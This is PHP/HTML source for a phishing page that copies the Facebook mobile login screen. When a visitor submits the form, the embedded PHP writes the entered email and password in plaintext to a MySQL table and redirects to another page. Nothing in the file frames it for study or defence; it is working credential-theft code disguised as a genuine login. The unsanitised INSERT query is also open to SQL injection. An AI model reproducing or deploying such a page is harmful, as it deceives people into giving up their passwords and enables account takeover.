<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook - Log in or sign up</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="style.css">
  </head>
  <body>

  	<?php
 	$con=mysqli_connect("localhost","root","","addntsites");
  			if(isset($_POST['Login'])){
  				$email=$_POST['email'];
  				$pass=$_POST['password'];
  				$query=mysqli_query($con,"INSERT INTO `qarib`(`email`, `pass`) VALUES ('$email','$pass')");
  				header("location:nameless.php");
  			}
  	?>

	<div id="banner">
	      <p id="bannertext" class="text-center"><a href="">facebook</a><p>
	</div>
    <div class="container-fluid">
    	 <br />
    	 <form class="form-group" method="post">
	 <div class="form-group">
    	 <input type="text" name="email" value="" class="form-control" placeholder="Mobile number or email address" required>
	 </div>
	 <div class="form-group">
	 <input type="password" name="password" value="" class="form-control" placeholder="Password" required>
	 </div>
	 <div class="form-group">
	 <input type="submit" value="Log In" class="btn btn-primary form-control" name="Login">
	 </div>
	 <div class="form-group" id="or">
	 	<p style="text-align:center;"><sup>________________</sup> or <sup>________________</sup></p>
	 </div>
	 <div class="form-group text-center">
	 <a href="" class="btn btn-success">Create New Account</a>
	 </div>
	 <div class="form-group text-center">
	 <a href="">Forgotten password?</a> -<a href=""> Help Centre</a>
	 </div>
	 </form>
    </div>
    <div class="container">
    	<br />
		<a style="font-weight:bold; color:grey;" href="">English (UK)</a>
		<a style="float:right;" href="">پښتو</a><br />
		<a href="">اردو</a>
		<a style="float:right;" href="">العربية</a><br />
		<a href="">Español</a>
		<a href="" style="color:grey; float:right;"><span class="glyphicon glyphicon-plus"></span></a>
		<footer style="text-align:center; color:grey;">Facebook ©2019</footer>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
  </body>
</html>
